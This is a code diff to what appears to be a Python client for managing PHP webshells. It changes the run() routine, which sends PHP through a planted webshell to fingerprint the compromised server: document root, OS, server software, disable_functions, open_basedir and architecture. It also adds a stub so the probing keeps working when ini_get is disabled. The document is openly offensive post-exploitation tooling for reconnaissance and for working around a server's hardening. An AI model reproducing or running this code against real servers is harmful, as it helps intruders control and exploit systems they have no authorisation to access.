@@ -134,8 +134,14 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[
              1].split("|" + version_flag_end)[0], namespace="webshell")
         info_req = send(
-            """$bit=PHP_INT_SIZE==4?32:64;
-print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.sys_get_temp_dir().'|'.ini_get('disable_functions').'|'.ini_get('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);"""
+            """
+if (!function_exists('ini_get')) {
+    function ini_get($v) {
+        return "error";
+    }
+}
+$bit=PHP_INT_SIZE==4?32:64;
+print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.sys_get_temp_dir().'|'.ini_get('disable_functions').'|'.ini_get('open_basedir').'|'.$bit.'|'.DIRECTORY_SEPARATOR);""".strip()
         )
         info = info_req.r_text.strip().split("|")
         exec_func = send(get_detectd_exec_php()).r_text.strip()
@@ -167,6 +173,7 @@ print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].
             disable_function_list.remove('')
         gset("webshell.obd", info[6], namespace="webshell")
         bits = info[7]
+
         try:
             bits = int(bits)
         except ValueError:
@@ -175,6 +182,8 @@ print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].
         gset("webshell.os_version", info[1] +
              " (%d bits)" % bits, namespace="webshell")
         gset("webshell.arch", bits, namespace="webshell")
+
+        info[8] = info[8] if info[8] else "/"
         gset("webshell.directory_separator", info[8], namespace="webshell")
         gset("webshell.disable_functions",
              disable_function_list, namespace="webshell")
